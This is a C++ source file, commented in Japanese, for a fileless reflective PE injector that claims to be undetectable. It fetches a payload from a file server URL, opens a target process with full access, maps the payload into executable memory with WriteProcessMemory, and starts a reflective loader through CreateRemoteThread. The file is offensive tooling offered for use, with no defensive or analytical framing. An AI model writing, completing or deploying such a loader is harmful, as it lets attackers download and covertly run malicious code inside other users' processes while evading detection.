// ファイルレスの反射型PEインジェクター
// 検出不可能な形で、ペイロードをドロップしてメモリ内で実行します
#include "injector.h"

Arg arg;

// エントリポイント
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    std::wstring url = makeUrl(arg);

    // プロセス名からプロセスIDを取得
    DWORD processId = 0;
    GetProcessIdToProcessName(arg.targetProcessName, processId);

    // ファイルサーバーからペイロードをステージング
    std::vector<BYTE> shellcode;
    StagingPayload(url, shellcode);
    PBYTE payload = reinterpret_cast<PBYTE>(shellcode.data());

    // プロセスを開く
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

    // 各PEヘッダの先頭アドレスを取得
    PIMAGE_DOS_HEADER pOldDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(payload);
    PIMAGE_NT_HEADERS pOldNtHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(payload + reinterpret_cast<PIMAGE_DOS_HEADER>(payload)->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOldOptionalHeader = &pOldNtHeader->OptionalHeader;
    PIMAGE_FILE_HEADER pOldFileHeader = &pOldNtHeader->FileHeader;

    // SizeOfImage分のメモリを確保
    PBYTE pBase = reinterpret_cast<PBYTE>(VirtualAllocEx(processHandle, nullptr, pOldOptionalHeader->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

    // 反射型ローダーの引数を格納
    MANUAL_MAPPING_DATA data{};
    data.pLoadLibraryA = LoadLibraryA;
    data.pGetProcAddress = GetProcAddress;
    data.pBase = pBase;
    data.fdwReasonParam = DLL_PROCESS_ATTACH;
    data.reservedParam = 0;

    // ヘッダーをコピー
    WriteProcessMemory(processHandle, pBase, payload, pOldOptionalHeader->SizeOfHeaders, nullptr);

    // セクションをコピー
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pOldNtHeader);
    for (UINT i = 0; i != pOldFileHeader->NumberOfSections; ++i, ++pSectionHeader) {
        if (pSectionHeader->SizeOfRawData) {
            WriteProcessMemory(processHandle, pBase + pSectionHeader->VirtualAddress, payload + pSectionHeader->PointerToRawData, pSectionHeader->SizeOfRawData, nullptr);
        }
    }

    // 反射型ローダーを書き込む
    PBYTE pReflectiveLoader = reinterpret_cast<PBYTE>(VirtualAllocEx(processHandle, nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
    WriteProcessMemory(processHandle, pReflectiveLoader, ReflectiveLoader, 0x1000, nullptr);

    // 反射型ローダーの引数を書き込む
    LPVOID pReflectiveLoaderArg = VirtualAllocEx(processHandle, nullptr, sizeof(MANUAL_MAPPING_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(processHandle, pReflectiveLoaderArg, &data, sizeof(MANUAL_MAPPING_DATA), nullptr);

    // リモートスレッドを作成して反射型ローダーを起動
    CreateRemoteThread(processHandle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pReflectiveLoader), pReflectiveLoaderArg, 0, nullptr);



    return 0;
}